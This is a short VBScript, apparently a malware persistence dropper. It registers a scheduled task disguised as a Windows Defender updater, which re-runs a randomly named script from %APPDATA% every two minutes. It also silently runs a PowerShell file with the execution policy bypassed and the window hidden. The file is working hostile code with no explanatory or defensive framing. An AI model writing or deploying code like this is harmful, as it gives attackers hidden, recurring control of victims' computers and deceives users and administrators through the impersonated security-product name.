Dim fso, appDataPath, service, vbFile, psFile, sh, taskDef, trigger, action
Set service = CreateObject("Schedule.Service")
Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
appDataPath = sh.ExpandEnvironmentStrings("%APPDATA%")
Set folder = fso.GetFolder(appDataPath)
vbFile = folder & "\plkjhgyuilkjhgfrtyuikjhgfghjkl.vbs"
psFile = folder & "\plkjhgyuilkjhgfrtyuikjhgfghjkl.ps1"
service.Connect
Set rootFolder = service.GetFolder("\")  
Set taskDef = service.NewTask(0)
taskDef.RegistrationInfo.Description = "WindowsDefenderUpdateSchedule"
taskDef.RegistrationInfo.Author = "System"
taskDef.Settings.Enabled = True
taskDef.Settings.StartWhenAvailable = True
Set trigger = taskDef.Triggers.Create(1)
trigger.StartBoundary = "2025-08-31T00:00:00"
trigger.Repetition.Interval = "PT2M"
Set action = taskDef.Actions.Create(0)
action.Path = "wscript.exe"
action.Arguments = """" & vbFile & """"
rootFolder.RegisterTaskDefinition "WindowsDefenderUpdateScheduler", taskDef, 6, , , 3
sh.Run "powershell.exe -ExecutionPolicy Bypass -File """ & psFile & """", 0, False
